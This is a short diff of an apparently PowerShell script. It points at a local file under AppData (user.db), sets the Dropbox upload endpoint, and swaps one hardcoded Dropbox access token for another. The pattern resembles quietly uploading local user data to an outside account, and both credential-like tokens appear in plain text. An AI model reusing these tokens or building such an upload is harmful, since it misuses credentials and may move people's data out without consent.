@@ -2,7 +2,7 @@
 $fileToUpload = "$env:LOCALAPPDATA\Microsoft\user.db"
 
 # Set the Dropbox access token
-$accessToken = "sl.Bbq6L1ZIPtJV0ID5nl4MnGZx7eBPt2jN5V5veeT3trsvp5sKQqy1DKcKcRrvbgryGcGlvY_b3WzEBLqV_Crs1LhghOmy5PH_3zxNItMadvX-PTA1PQZIFfib1JLYaayx1gI8pZVvXd0"
+$accessToken = "sl.BbtkrYORs55gK99uUh5x4d7qJKjWXfoB7cUI78ELi5xLfw4zgX_lxn45F40TVUWru3EMJPq_VKAcjabOdW99a7a4pqbOI6GKqSzS8p-gjMq2m8AB-nrzRml-PiiqIu70OlzjYXNF2cRt"
 
 # Set the Dropbox API endpoint
 $dropboxApiEndpoint = "https://content.dropboxapi.com/2/files/upload"
